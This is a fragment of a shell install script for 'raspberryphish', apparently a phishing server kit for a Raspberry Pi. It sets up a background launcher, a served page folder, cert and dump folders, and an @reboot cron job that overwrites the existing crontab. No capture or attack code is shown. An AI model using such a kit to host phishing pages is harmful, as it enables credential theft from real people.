
# configure launcher script
cat <<EOF > "$SERVERPATH/launcher-raspberryphish-server.sh"
#!/bin/sh
# launcher for raspberryphish server
sleep 10
cd $SERVERPATH
python3 main.py 1>> ./logs/log-$(date +%Y-%m-%d_%H-%M) 2>> ./logs/log-error-$(date +%Y-%m-%d_%H-%M) &
EOF

# make it launchable
chmod 755 "$SERVERPATH/launcher-raspberryphish-server.sh"


# copy server in the given directory
cp -r  ./server/*  "$SERVERPATH/"

# replace the root page folder
sed -i "/pagePath = \"test\/\"/c pagePath = \"$PAGE\/\"" $SERVERPATH/main.py


# make a cert folder
# @ TODO
if [ -d "$SERVERPATH/cert" ]
then
echo "«$SERVERPATH/cert» existe deja"
else
    mkdir  "$SERVERPATH/cert"
    if [ -d "$SERVERPATH/cert/$PAGE" ]
    then
    echo "«$SERVERPATH/cert/$PAGE» existe deja"
    else
        mkdir  "$SERVERPATH/cert/$PAGE"
    fi
fi

# make a log folder
if [ -d "$SERVERPATH/logs" ]
then
echo "«$SERVERPATH/logs» existe deja"
else
    mkdir  "$SERVERPATH/logs"
    if [ -d "$SERVERPATH/logs/dump" ]
    then
    echo "«$SERVERPATH/logs/dump» existe deja"
    else
        mkdir  "$SERVERPATH/logs/dump"
    fi
fi

# configure cron-file
echo  "@reboot sh $SERVERPATH/launcher-raspberryphish-server.sh 1> $SERVERPATH/logs/cronlog 2> $SERVERPATH/logs/cronlog-error &"  >  ./install/cron-file

# load it
crontab ./install/cron-file
